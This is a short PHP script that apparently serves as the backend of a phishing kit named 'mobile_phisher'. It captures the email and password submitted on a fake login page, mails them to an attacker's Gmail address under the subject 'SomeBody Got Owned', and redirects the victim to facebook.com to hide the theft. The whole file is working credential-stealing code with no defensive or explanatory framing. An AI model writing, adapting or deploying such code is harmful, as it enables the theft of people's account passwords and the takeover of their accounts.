<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("pwned.html");
$searchString = "<html><title>Your Connection To This Website is Secure</title>
<text>You Have Been PWNED!</text>
</html>";
if($myFile == $searchString) {
    header('Location: https://facebook.com/');
}
if($myFile != $searchString) {
    header('Location: https://facebook.com/');
}
$headers = "From: (any valid email address)";
$to = "(valid receiver's Gmail )";
$txt ="mobile_phisher Captured These Credentials

Email :- $var
Password :- $var2";
$subject = "SomeBody Got Owned";
mail($to,$subject,$txt,$headers);
exit();
//validmail address entered yet not got access chexck in spam.
?>

